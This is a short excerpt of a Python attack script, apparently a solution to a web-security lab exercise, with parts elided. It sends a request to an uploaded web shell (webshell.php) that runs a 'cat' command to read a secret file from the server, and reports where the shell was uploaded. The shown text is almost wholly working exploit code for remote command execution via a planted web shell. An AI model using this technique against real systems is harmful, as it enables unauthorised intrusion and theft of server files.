...
def execute_command(url, cookie):
    response = requests.get(f"{url}/files/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
    print(response.text)
...
def main():
    ...
    print(f"(+) Web shell has been uploaded here: {url}/files/webshell.php")
